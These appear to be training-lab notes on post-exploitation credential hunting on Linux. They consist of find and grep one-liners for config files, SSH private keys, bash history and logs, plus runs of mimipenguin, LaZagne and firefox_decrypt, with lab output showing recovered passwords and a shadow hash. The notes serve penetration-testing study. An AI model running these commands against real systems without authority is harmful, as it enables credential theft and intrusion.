# Credential Hunting on Linux


## Several sources that can provide credentials

| Files | History | Memory | Key-Rings |
| ----- | ------- | ------ | --------- |
| Configs | Logs | Cache | Browser stored credentials |
| Databases | Command-line History | In-memory Processing | 	 |
| Notes	 | 	 |  |  |
| Scripts	 |  |  | 		 |
| Source codes	 |  |  | 		 |
| Cronjobs		 |  |  | 	 |
| SSH Keys		 |  |  |  |

## Files
> One core principle of Linux is that everything is a file.

We should look for, find, and inspect several categories of files one by one.
File categories:
1. Configuration files (.config, .conf, .cnf)
1. Databases (.db, .gvdb, .tdb)
1. Notes (.txt)
1. Scripts (.js, .rb, .py, .sh)
1. Cronjobs
1. SSH keys (/.ssh)

### Search for Configuration Files
```bash
xxxxxxx@unixclient:~$ for l in $(echo ".conf .config .cnf");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "lib\|fonts\|share\|core" ;done

File extension:  .conf
/run/tmpfiles.d/static-nodes.conf
/run/NetworkManager/resolv.conf
/run/NetworkManager/no-stub-resolv.conf
/run/NetworkManager/conf.d/10-globally-managed-devices.conf
...SNIP...
/etc/ltrace.conf
/etc/rygel.conf
/etc/ld.so.conf.d/x86_64-linux-gnu.conf
/etc/ld.so.conf.d/fakeroot-x86_64-linux-gnu.conf
/etc/fprintd.conf

File extension:  .config
/usr/src/linux-headers-5.13.0-27-generic/.config
/usr/src/linux-headers-5.11.0-27-generic/.config
/usr/src/linux-hwe-5.13-headers-5.13.0-27/tools/perf/Makefile.config
/usr/src/linux-hwe-5.13-headers-5.13.0-27/tools/power/acpi/Makefile.config
/usr/src/linux-hwe-5.11-headers-5.11.0-27/tools/perf/Makefile.config
/usr/src/linux-hwe-5.11-headers-5.11.0-27/tools/power/acpi/Makefile.config
/home/Username/.config
/etc/X11/Xwrapper.config
/etc/manpath.config

File extension:  .cnf
/etc/ssl/openssl.cnf
/etc/alternatives/my.cnf
/etc/mysql/my.cnf
/etc/mysql/debian.cnf
/etc/mysql/mysql.conf.d/mysqld.cnf
/etc/mysql/mysql.conf.d/mysql.cnf
/etc/mysql/mysql.cnf
/etc/mysql/conf.d/mysqldump.cnf
/etc/mysql/conf.d/mysql.cnf
```

### Search for Credentials in Configuration Files
```bash
xxxxxx@unixclient:~$ for i in $(find / -name *.cnf 2>/dev/null | grep -v "doc\|lib");do echo -e "\nFile: " $i; grep "user\|password\|pass" $i 2>/dev/null | grep -v "\#";done

File:  /snap/core18/2128/etc/ssl/openssl.cnf
challengePassword		= A challenge password

File:  /usr/share/ssl-cert/ssleay.cnf

File:  /etc/ssl/openssl.cnf
challengePassword		= A challenge password

File:  /etc/alternatives/my.cnf

File:  /etc/mysql/my.cnf

File:  /etc/mysql/debian.cnf

File:  /etc/mysql/mysql.conf.d/mysqld.cnf
user		= mysql

File:  /etc/mysql/mysql.conf.d/mysql.cnf

File:  /etc/mysql/mysql.cnf

File:  /etc/mysql/conf.d/mysqldump.cnf

File:  /etc/mysql/conf.d/mysql.cnf
```

### Search for Database
```bash
xxxxxxx@unixclient:~$ for l in $(echo ".sql .db .*db .db*");do echo -e "\nDB File extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share\|man";done

DB File extension:  .sql

DB File extension:  .db
/var/cache/dictionaries-common/ispell.db
/var/cache/dictionaries-common/aspell.db
/var/cache/dictionaries-common/wordlist.db
/var/cache/dictionaries-common/hunspell.db
/home/Username/.mozilla/firefox/1bplpd86.default-release/cert9.db
/home/Username/.mozilla/firefox/1bplpd86.default-release/key4.db
/home/Username/.cache/tracker/meta.db

DB File extension:  .*db
/var/cache/dictionaries-common/ispell.db
/var/cache/dictionaries-common/aspell.db
/var/cache/dictionaries-common/wordlist.db
/var/cache/dictionaries-common/hunspell.db
/home/Username/.mozilla/firefox/1bplpd86.default-release/cert9.db
/home/Username/.mozilla/firefox/1bplpd86.default-release/key4.db
/home/Username/.config/pulse/3a1ee8276bbe4c8e8d767a2888fc2b1e-card-database.tdb
/home/Username/.config/pulse/3a1ee8276bbe4c8e8d767a2888fc2b1e-device-volumes.tdb
/home/Username/.config/pulse/3a1ee8276bbe4c8e8d767a2888fc2b1e-stream-volumes.tdb
/home/Username/.cache/tracker/meta.db
/home/Username/.cache/tracker/ontologies.gvdb

DB File extension:  .db*
/var/cache/dictionaries-common/ispell.db
/var/cache/dictionaries-common/aspell.db
/var/cache/dictionaries-common/wordlist.db
/var/cache/dictionaries-common/hunspell.db
/home/Username/.dbus
/home/Username/.mozilla/firefox/1bplpd86.default-release/cert9.db
/home/Username/.mozilla/firefox/1bplpd86.default-release/key4.db
/home/Username/.cache/tracker/meta.db-shm
/home/Username/.cache/tracker/meta.db-wal
/home/Username/.cache/tracker/meta.db
```

### Searching for Notes
```bash
Username@unixclient:~$ find /home/* -type f -name "*.txt" -o ! -name "*.*"

/home/Username/.config/caja/desktop-metadata
/home/Username/.config/clipit/clipitrc
/home/Username/.config/dconf/user
/home/Username/.mozilla/firefox/bh4w5vd0.default-esr/pkcs11.txt
/home/Username/.mozilla/firefox/bh4w5vd0.default-esr/serviceworker.txt
...SNIP...
```
### Searching for Scripts
```bash
Username@unixclient:~$ for l in $(echo ".py .pyc .pl .go .jar .c .sh");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share";done

File extension:  .py

File extension:  .pyc

File extension:  .pl

File extension:  .go

File extension:  .jar

File extension:  .c

File extension:  .sh
/snap/gnome-3-34-1804/72/etc/profile.d/vte-2.91.sh
/snap/gnome-3-34-1804/72/usr/bin/gettext.sh
/snap/core18/2128/etc/init.d/hwclock.sh
/snap/core18/2128/etc/wpa_supplicant/action_wpa.sh
/snap/core18/2128/etc/wpa_supplicant/functions.sh
...SNIP...
/etc/profile.d/xdg_dirs_desktop_session.sh
/etc/profile.d/cedilla-portuguese.sh
/etc/profile.d/im-config_wayland.sh
/etc/profile.d/vte-2.91.sh
/etc/profile.d/bash_completion.sh
/etc/profile.d/apps-bin-path.sh
```
### Searching for Cronjobs

> Example of cronjob
```bash
Username@unixclient:~$ cat /etc/crontab 

# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
```
```bash
Username@unixclient:~$ ls -la /etc/cron.*/

/etc/cron.d/:
total 28
drwxr-xr-x 1 root root  106  3. Jan 20:27 .
drwxr-xr-x 1 root root 5728  1. Feb 00:06 ..
-rw-r--r-- 1 root root  201  1. Mär 2021  e2scrub_all
-rw-r--r-- 1 root root  331  9. Jan 2021  geoipupdate
-rw-r--r-- 1 root root  607 25. Jan 2021  john
-rw-r--r-- 1 root root  589 14. Sep 2020  mdadm
-rw-r--r-- 1 root root  712 11. Mai 2020  php
-rw-r--r-- 1 root root  102 22. Feb 2021  .placeholder
-rw-r--r-- 1 root root  396  2. Feb 2021  sysstat

/etc/cron.daily/:
total 68
drwxr-xr-x 1 root root  252  6. Jan 16:24 .
drwxr-xr-x 1 root root 5728  1. Feb 00:06 ..
...SNIP...
```

### Searching for SSH Private Keys

>SSH Private Keys
```bash
Username@unixclient:~$ grep -rnw "PRIVATE KEY" /home/* 2>/dev/null | grep ":1"

/home/Username/.ssh/internal_db:1:-----BEGIN OPENSSH PRIVATE KEY-----
```
>SSH Public Keys
```bash
Username@unixclient:~$ grep -rnw "ssh-rsa" /home/* 2>/dev/null | grep ":1"

/home/Username/.ssh/internal_db.pub:1:ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCraK
```

### Search for History files

>In the history of the commands entered on Linux distributions that use Bash as a standard shell, we find the associated files in .bash_history. Nevertheless, other files like .bashrc or .bash_profile can contain important information.
```bash
Username@unixclient:~$ tail -n5 /home/*/.bash*

==> /home/Username/.bash_history <==
vim ~/testing.txt
vim ~/testing.txt
chmod 755 /tmp/api.py
su
/tmp/api.py Username 6mX4UP1eWH3HXK

==> /home/Username/.bashrc <==
    . /usr/share/bash-completion/bash_completion
  elif [ -f /etc/bash_completion ]; then
    . /etc/bash_completion
  fi
fi
```

### Search for Logs

1. Application Logs
1. Event Logs
1. Service Logs
1. System Logs

| Log File | Description |
| -------- | ----------- |
| /var/log/messages | Generic system activity logs. |
| /var/log/syslog | Generic system activity logs. |
| /var/log/auth.log | (Debian) All authentication related logs. |
| /var/log/secure | (RedHat/CentOS) All authentication related logs. |
| /var/log/boot.log | Booting information. |
| /var/log/dmesg | Hardware and drivers related information and logs. |
| /var/log/kern.log | Kernel related warnings, errors and logs. |
| /var/log/faillog | Failed login attempts. |
| /var/log/cron | Information related to cron jobs. |
| /var/log/mail.log | All mail server related logs. |
| /var/log/httpd | All Apache related logs. |
| /var/log/mysqld.log | All MySQL server related logs. |


```bash
Username@unixclient:~$ for i in $(ls /var/log/* 2>/dev/null);do GREP=$(grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null); if [[ $GREP ]];then echo -e "\n#### Log file: " $i; grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null;fi;done

#### Log file:  /var/log/dpkg.log.1
2022-01-10 17:57:41 install libssh-dev:amd64 <none> 0.9.5-1+deb11u1
2022-01-10 17:57:41 status half-installed libssh-dev:amd64 0.9.5-1+deb11u1
2022-01-10 17:57:41 status unpacked libssh-dev:amd64 0.9.5-1+deb11u1 
2022-01-10 17:57:41 configure libssh-dev:amd64 0.9.5-1+deb11u1 <none> 
2022-01-10 17:57:41 status unpacked libssh-dev:amd64 0.9.5-1+deb11u1 
2022-01-10 17:57:41 status half-configured libssh-dev:amd64 0.9.5-1+deb11u1
2022-01-10 17:57:41 status installed libssh-dev:amd64 0.9.5-1+deb11u1

...SNIP...
```

### Search Memory and Cache for Credentials

>Memory - [Mimipenguin](https://github.com/huntergregal/mimipenguin)
```bash
Username@unixclient:~$ sudo python3 mimipenguin.py
[sudo] password for Username: 

[SYSTEM - GNOME]	Username:WLpAEXFa0SbqOHY


Username@unixclient:~$ sudo bash mimipenguin.sh 
[sudo] password for Username: 

MimiPenguin Results:
[SYSTEM - GNOME]          Username:WLpAEXFa0SbqOHY
```

> Memory - LaZagne
Wifi	Wpa_supplicant	Libsecret	Kwallet
Chromium-based	CLI	Mozilla	Thunderbird
Git	Env_variable	Grub	Fstab
AWS	Filezilla	Gftp	SSH
Apache	Shadow	Docker	KeePass
Mimipy	Sessions	Keyrings
```bash
Username@unixclient:~$ sudo python2.7 laZagne.py all

|====================================================================|
|                                                                    |
|                        The LaZagne Project                         |
|                                                                    |
|                          ! BANG BANG !                             |
|                                                                    |
|====================================================================|

------------------- Shadow passwords -----------------

[+] Hash found !!!
Login: systemd-coredump
Hash: !!:18858::::::

[+] Hash found !!!
Login: sambauser
Hash: $6$wgK4tGq7Jepa.V0g$QkxvseL.xkC3jo682xhSGoXXOGcBwPLc2CrAPugD6PYXWQlBkiwwFs7x/fhI.8negiUSPqaWyv7wC8uwsWPrx1:18862:0:99999:7:::

[+] Password found !!!
Login: Username
Password: WLpAEXFa0SbqOHY


[+] 3 passwords have been found.
For more information launch it again with the -v option

elapsed time = 3.50091600418
```

### Search for Credential in Browsers

> Firefox Stored Credentials
```bash
Username@unixclient:~$ ls -l .mozilla/firefox/ | grep default 

drwx------ 11 Username Username 4096 Jan 28 16:02 1bplpd86.default-release
drwx------  2 Username Username 4096 Jan 28 13:30 lfx3lvhb.default
```
```json
Username@unixclient:~$ cat .mozilla/firefox/1bplpd86.default-release/logins.json | jq .

{
  "nextId": 2,
  "logins": [
    {
      "id": 1,
      "hostname": "https://www.inlanefreight.com",
      "httpRealm": null,
      "formSubmitURL": "https://www.inlanefreight.com",
      "usernameField": "username",
      "passwordField": "password",
      "encryptedUsername": "MDoEEPgAAAA...SNIP...1liQiqBBAG/8/UpqwNlEPScm0uecyr",
      "encryptedPassword": "MEIEEPgAAAA...SNIP...FrESc4A3OOBBiyS2HR98xsmlrMCRcX2T9Pm14PMp3bpmE=",
      "guid": "{412629aa-4113-4ff9-befe-dd9b4ca388e2}",
      "encType": 1,
      "timeCreated": 1643373110869,
      "timeLastUsed": 1643373110869,
      "timePasswordChanged": 1643373110869,
      "timesUsed": 1
    }
  ],
  "potentiallyVulnerablePasswords": [],
  "dismissedBreachAlertsByLoginGUID": {},
  "version": 3
}
```
> Decrypting Firefox Credentials
```bash
Attacker@xxx[/xxx]$ python3.9 firefox_decrypt.py

Select the Mozilla profile you wish to decrypt
1 -> lfx3lvhb.default
2 -> 1bplpd86.default-release

2

Website:   https://testing.dev.inlanefreight.com
Username: 'test'
Password: 'test'

Website:   https://www.inlanefreight.com
Username: 'Username'
Password: 'FzXUxJemKm6g2lGh'
```

>Using LaZagne
```bash
Username@unixclient:~$ python3 laZagne.py browsers

|====================================================================|
|                                                                    |
|                        The LaZagne Project                         |
|                                                                    |
|                          ! BANG BANG !                             |
|                                                                    |
|====================================================================|

------------------- Firefox passwords -----------------

[+] Password found !!!
URL: https://testing.dev.inlanefreight.com
Login: test
Password: test

[+] Password found !!!
URL: https://www.inlanefreight.com
Login: Username
Password: FzXUxJemKm6g2lGh


[+] 2 passwords have been found.
For more information launch it again with the -v option

elapsed time = 0.2310788631439209
```
